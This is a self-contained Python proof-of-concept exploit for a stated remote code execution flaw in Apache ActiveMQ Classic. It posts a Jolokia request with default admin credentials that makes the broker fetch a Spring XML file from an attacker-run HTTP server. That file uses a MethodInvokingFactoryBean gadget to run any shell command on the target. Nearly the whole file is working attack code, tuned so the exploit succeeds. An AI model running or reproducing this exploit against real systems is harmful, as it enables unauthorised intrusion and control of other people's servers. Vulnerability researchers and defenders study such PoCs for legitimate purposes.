#!/usr/bin/env python3
"""
CVE-2026-34197 — Apache ActiveMQ Classic RCE via Jolokia / xbean
Self-contained PoC. Zero external deps (stdlib only).

Affected: ActiveMQ Classic < 5.19.4, 6.0.0 ≤ V < 6.2.3
Fixed:    5.19.4, 6.2.3

Why this rewrite (vs out/cve-2026-34197-activemq/poc.py):
  - The original payload set <property name="redirectErrorStream"/> on
    java.lang.ProcessBuilder — but ProcessBuilder.redirectErrorStream(boolean)
    is fluent (returns the builder), not a JavaBean setter, so Spring's bean
    factory throws NotWritablePropertyException and never calls .start().
  - The original --auto mode shut down the HTTP server on the first GET, but
    Spring fetches the XML again during deferred bean instantiation, hitting
    Connection refused.
  - This rewrite uses the MethodInvokingFactoryBean → Runtime.getRuntime().exec
    gadget (proven working in out/cve-2026-34197-lab/exploit/payload.xml) and
    keeps the HTTP server alive throughout the run.

For authorized security testing only.
"""

import argparse
import base64
import http.server
import json
import socketserver
import sys
import threading
import time
import urllib.error
import urllib.request

JOLOKIA_PATH = "/api/jolokia/"
PAYLOAD_PATH = "/poc-payload.xml"

PAYLOAD_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

  <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject">
      <bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetClass" value="java.lang.Runtime"/>
        <property name="targetMethod" value="getRuntime"/>
      </bean>
    </property>
    <property name="targetMethod" value="exec"/>
    <property name="arguments">
      <list>
        <array value-type="java.lang.String">
          <value>/bin/sh</value>
          <value>-c</value>
          <value>{command}</value>
        </array>
      </list>
    </property>
  </bean>

</beans>
"""


class _PayloadHandler(http.server.BaseHTTPRequestHandler):
    payload_xml = b""
    fetched = threading.Event()

    def log_message(self, fmt, *args):
        sys.stderr.write("[srv] %s - %s\n" % (self.address_string(), fmt % args))

    def do_GET(self):
        if self.path != PAYLOAD_PATH and self.path != "/":
            self.send_error(404); return
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Content-Length", str(len(self.payload_xml)))
        self.end_headers()
        self.wfile.write(self.payload_xml)
        self.fetched.set()


class _ThreadedHTTP(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def serve_payload(port: int, command: str):
    _PayloadHandler.payload_xml = PAYLOAD_TEMPLATE.format(
        command=command.replace("&", "&amp;").replace("<", "&lt;")
    ).encode()
    srv = _ThreadedHTTP(("0.0.0.0", port), _PayloadHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def send_exploit(target: str, port: int, user: str, password: str,
                 lhost: str, lport: int, broker_name: str = "localhost",
                 use_add_connector: bool = False):
    operation = "addConnector" if use_add_connector else "addNetworkConnector"
    uri = "static:(vm://evil?brokerConfig=xbean:http://%s:%d%s)" % (lhost, lport, PAYLOAD_PATH)
    body = {
        "type": "exec",
        "mbean": f"org.apache.activemq:type=Broker,brokerName={broker_name}",
        "operation": f"{operation}(java.lang.String)",
        "arguments": [uri],
    }
    url = f"http://{target}:{port}{JOLOKIA_PATH}"
    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode(),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Basic {creds}",
            "Origin": f"http://{target}:{port}",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.status, resp.read().decode()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="ActiveMQ web-console host")
    ap.add_argument("--port", type=int, default=8161)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="admin")
    ap.add_argument("--lhost", required=True, help="Attacker IP visible to target")
    ap.add_argument("--lport", type=int, default=8888)
    ap.add_argument("--command", "-c", default="id > /tmp/pwned.txt",
                    help="Command to execute on target")
    ap.add_argument("--broker-name", default="localhost")
    ap.add_argument("--use-add-connector", action="store_true",
                    help="Use addConnector instead of addNetworkConnector")
    ap.add_argument("--wait", type=float, default=10.0,
                    help="Seconds to keep payload server alive after exploit (default 10)")
    ap.add_argument("--serve-only", action="store_true",
                    help="Just serve the payload (don't send exploit). For external orchestration.")
    args = ap.parse_args()

    srv = serve_payload(args.lport, args.command)
    print(f"[*] payload server up on 0.0.0.0:{args.lport}, lhost={args.lhost}", file=sys.stderr)

    if args.serve_only:
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            srv.shutdown(); return

    print(f"[*] target = http://{args.target}:{args.port}", file=sys.stderr)
    try:
        status, response = send_exploit(
            args.target, args.port, args.user, args.password,
            args.lhost, args.lport, args.broker_name, args.use_add_connector,
        )
        print(f"[+] jolokia http {status} -> {response[:240]}", file=sys.stderr)
    except urllib.error.HTTPError as e:
        print(f"[-] jolokia HTTP error {e.code}: {e.read().decode()[:240]}", file=sys.stderr)
        srv.shutdown(); sys.exit(2)
    except Exception as e:
        print(f"[-] jolokia request failed: {e}", file=sys.stderr)
        srv.shutdown(); sys.exit(2)

    if _PayloadHandler.fetched.wait(timeout=args.wait):
        print("[+] payload was fetched by target", file=sys.stderr)
    else:
        print("[-] no fetch within wait window — exploit may have failed", file=sys.stderr)
    # Keep server alive for the broker's deferred Spring-load round-trips
    time.sleep(args.wait)
    srv.shutdown()


if __name__ == "__main__":
    main()
